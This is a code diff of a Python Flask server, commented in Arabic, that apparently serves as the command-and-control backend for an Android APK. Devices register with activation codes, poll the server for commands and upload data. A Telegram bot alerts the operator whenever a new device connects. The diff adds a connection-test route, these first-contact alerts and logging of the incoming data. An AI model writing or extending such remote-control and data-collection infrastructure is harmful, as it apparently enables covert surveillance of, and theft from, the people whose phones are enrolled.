@@ -128,11 +128,38 @@ def build_apk_panel(device_id):
 def init_apk_routes(app, bot):
 
     # ============================================================
-    # ★★★ التحقق من كود التنشيط ★★★
+    # ★ اختبار الاتصال — للتشخيص ★
+    # ============================================================
+    @app.route('/apk/test', methods=['GET'])
+    def apk_test():
+        code = request.args.get('code', '')
+        device = request.args.get('device', '')
+        print(f"[TEST] APK connected! Code: {code} | Device: {device[:16]}")
+        
+        # أبلغ المستخدم
+        if code and code != "DEFAULT":
+            try:
+                chat_id = get_apk_code(code)
+                if chat_id:
+                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+                    bot.send_message(
+                        cid,
+                        f"🔗 **اختبار اتصال ناجح!**\n"
+                        f"🔑 الكود: `{code}`\n"
+                        f"📱 Device: `{device[:16]}`\n"
+                        f"✅ APK يتصل بالسيرفر بنجاح",
+                        parse_mode="Markdown"
+                    )
+            except Exception as e:
+                print(f"[-] test notify error: {e}")
+        
+        return jsonify({"status": "ok", "message": "APK connected!"}), 200
+
+    # ============================================================
+    # ★ التحقق من كود التنشيط ★
     # ============================================================
     @app.route('/apk/verify', methods=['POST'])
     def apk_verify():
-        """يتحقق من كود التنشيط"""
         try:
             data = request.get_json(silent=True) or {}
             code = data.get("code", "").strip().upper()
@@ -147,7 +174,6 @@ def init_apk_routes(app, bot):
             if chat_id:
                 print(f"[+] APK verified: {code} -> {chat_id} | {device_brand} {device_model}")
                 
-                # أبلغ المستخدم
                 try:
                     cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                     bot.send_message(
@@ -171,7 +197,7 @@ def init_apk_routes(app, bot):
             return jsonify({"valid": False}), 200
 
     # ============================================================
-    # Polling للأوامر
+    # ★ Polling للأوامر ★
     # ============================================================
     @app.route('/apk/poll', methods=['GET'])
     def apk_poll():
@@ -185,7 +211,7 @@ def init_apk_routes(app, bot):
             if device_id not in apk_devices:
                 chat_id = get_apk_code(code) if code else None
                 if not chat_id:
-                    chat_id = code  # fallback
+                    chat_id = code
                 
                 apk_devices[device_id] = {
                     "device_id": device_id,
@@ -195,7 +221,22 @@ def init_apk_routes(app, bot):
                     "last_seen": time.time(),
                     "info": {},
                 }
-                print(f"[+] New APK device: {device_id[:16]} | code={code}")
+                print(f"[+] New APK device connected: {device_id[:16]} | code={code}")
+                
+                # ★ أرسل إشعار للمستخدم عند أول اتصال ★
+                if chat_id:
+                    try:
+                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+                        bot.send_message(
+                            cid,
+                            f"🎯 **جهاز جديد بدأ الاتصال!**\n"
+                            f"🆔 `{device_id[:16]}`\n"
+                            f"🔑 الكود: `{code}`",
+                            parse_mode="Markdown"
+                        )
+                    except Exception as e:
+                        print(f"[-] notify error: {e}")
+            
             apk_devices[device_id]["last_seen"] = time.time()
         
         commands = []
@@ -207,7 +248,7 @@ def init_apk_routes(app, bot):
         return jsonify({"commands": commands}), 200
 
     # ============================================================
-    # استقبال البيانات
+    # ★ استقبال البيانات ★
     # ============================================================
     @app.route('/apk/data', methods=['POST'])
     def apk_data():
@@ -216,6 +257,8 @@ def init_apk_routes(app, bot):
             device_id = data.get("device", "")
             code = data.get("code", "").upper()
             dtype = data.get("type", "")
+            
+            print(f"[APK DATA] type={dtype} | device={device_id[:16] if device_id else 'None'} | code={code}")
             
             if not device_id:
                 return jsonify({"status": "no_device"}), 200
